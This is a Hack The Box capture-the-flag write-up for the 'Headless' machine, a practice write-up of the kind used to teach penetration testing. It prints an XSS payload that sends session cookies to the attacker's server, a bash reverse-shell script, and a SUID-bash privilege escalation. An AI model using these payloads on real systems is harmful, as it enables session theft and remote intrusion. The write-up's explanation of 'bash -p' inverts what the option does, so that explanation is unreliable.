# Introduction
Hey There. Welcome to another HTB writeup. Today we will be covering Headless, a linux machine.
The core concepts being taught by pwning this machine are:
-- XSS
-- Privilege Escalation using SUDO

Without furthur ado, let's jump right in.

# Stage 1: Scanning and Enumeration
## Nmap Scan

Running an nmap scan (nmap -sC -sV **IP Address**) to see which ports are open, we get the following output:

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-24 12:35 EAT
Nmap scan report for 10.10.11.8
Host is up (0.71s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sun, 24 Mar 2024 09:38:46 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=3/24%Time=65FFF4A7%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Sun,\x2024\x20Mar\x202024\x2009:38:46\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Z
SF:fs;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\
SF:x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\
SF:x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construct
SF:ion</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20b
SF:ody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\
SF:x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20di
SF:splay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justif
SF:y-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x20
SF:0,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYP
SF:E\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x
SF:20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20resp
SF:onse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20vers
SF:ion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\
SF:x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x
SF:20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 338.81 seconds

Ok, so we have a default ssh port open and a python web server running on port 5000.

Inspecting the home page, we get the hint below which suggests that we might have to alter the value of is_admin cookie.
![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/is_admin_cookie(1).png)

## Web Directory Enumeration

Running GoBuster presents us with the following result:
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.8:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dashboard            (Status: 500) [Size: 265]
/support              (Status: 200) [Size: 2363]

===============================================================
Finished
===============================================================

NB: The reason it is showing status 500 (Internal Server Error) for /dashboard is because when I was running GoBuster, I had not specified that the cookie "is_admin" is to be used. Otherwise the status should be 401 (Unauthorized).

Checking out /dashboard, we get this:
![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/Unauthorized(2).png)

This confirms that indeed the value of is_admin needs to be different so as to grant access to this part of the page.

Checking out /support, we get this:
![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/Support_page(3).png)

To test for XSS, intercept the request, alter it and forward the request as shown below:
![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/Intercept_request(4).png)

The webpage responds as shown after forwarding the request:
![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/hacking_attempt_detected(5).png)

This indeed confirms the existence of an XSS vulnerability on the web server.

# Stage 2: Exploitation

After carrying out research on different ways of exploiting XSS, I attempted to see whether I can get a cookie from the web server by sending an XSS Payload that connects to my own server.

![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/own_server(6).png)

XSS Payload: <img src=x onerror=fetch('http://**IP Address**:8000/'+document.cookie);>

![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/burpsuite_xss_payload(7).png)

Another cookie is obtained:

![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/connected_to_own_server(8).png)

Replacing the value of is_admin with this newly obtained value and attempt to navigate to the dashboard page, we are able to see this:

![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/admin_dashboard(9).png)

At this point, since getting the web server to connect to my own server worked, why not try to get it to fetch a script from the same server and execute it e.g. a reverse shell?

the script:

#!/bin/bash
/bin/bash -c 'exec bash -i >& /dev/tcp/**IP Address**/**Port** 0>&1'

![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/burpsuite_revshell(10).png)

A reverse shell is spawned!

![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/revshell(11).png)

The first flag:
![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/userflag(12).png)

# Stage 3: Privilege Escalation

The second flag is obtained by exploiting SUDO

![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/sudo_l(13).png)

Opening the file using cat:

![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/opening_syscheck(14).png)

initdb.sh might have been deleted therefore we can create the same file, change the permissions for /bin/bash so that /bin/bash can be executed with the permissions of the owner and not the permissions of dvir and execute syscheck using sudo rights

![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/create_initdb_file(15).png)

![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/escalated_privs(16).png)

Running /bin/bash -p launches the bash shell with privileged access, due to the -p option. This option sets the effective user ID (EUID) to the real user ID (RUID), effectively giving the user running the command the permissions of the file's owner (usually root).

Finally, the flag is obtained from the root folder
![Alt Text](/home/logz/Desktop/CTFs/HTB/Headless/writeup/root_flag(17).png)














